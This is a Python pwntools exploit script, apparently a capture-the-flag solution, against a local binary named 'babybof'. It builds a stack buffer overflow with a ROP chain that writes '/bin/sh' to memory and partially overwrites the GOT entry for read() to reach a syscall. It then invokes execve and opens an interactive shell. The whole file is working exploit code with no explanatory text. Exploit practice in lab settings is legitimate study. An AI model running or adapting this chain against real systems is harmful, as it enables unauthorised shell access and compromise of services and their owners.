from pwn import *

#p = process('babybof')
p = remote('localhost', 30001)
elf = ELF('babybof')

bss = elf.bss()+200
read_plt = elf.plt['read']
read_got = elf.got['read']
pop_rdi = 0x400833
pop_rsi_r15 = 0x400831
pop_rbx = 0x40071b
xor_eax_ebx = 0x40070a

payload = "A"*216
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rbx)
payload += p64(59)

payload += p64(xor_eax_ebx)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(read_plt)

sleep(1)
p.send(payload)
sleep(1)
p.send('/bin/sh\x00')
sleep(1)
p.send('\x1e')
sleep(1)
p.interactive()
